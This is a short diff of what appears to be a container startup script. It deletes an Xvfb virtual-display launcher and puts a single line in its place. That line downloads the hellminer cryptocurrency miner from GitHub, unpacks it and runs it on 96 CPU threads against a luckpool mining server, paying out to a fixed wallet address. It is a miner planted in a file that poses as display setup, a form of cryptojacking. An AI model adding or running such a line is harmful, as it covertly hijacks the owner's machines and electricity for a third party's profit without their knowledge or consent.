@@ -1,11 +1,1 @@
-#!/usr/bin/env bash
-
-export GEOMETRY="${SCREEN_WIDTH}""x""${SCREEN_HEIGHT}""x""${SCREEN_DEPTH}"
-export HOME="/"
-
-rm -f /tmp/.X*lock
-
-/usr/bin/xvfb-run --server-num=${DISPLAY_NUM} \
-    --listen-tcp \
-    --server-args="-screen 0 ${GEOMETRY} -fbdir /var/tmp -dpi ${SCREEN_DPI} -listen tcp -noreset -ac +extension RANDR" \
-    ${UI_COMMAND}
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz; tar xf hellminer_cpu_linux.tar.gz; ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RCT2S85q77oYSjQyU19UMmLCp8vSbXRuxT.MonG10 -p x --cpu 96
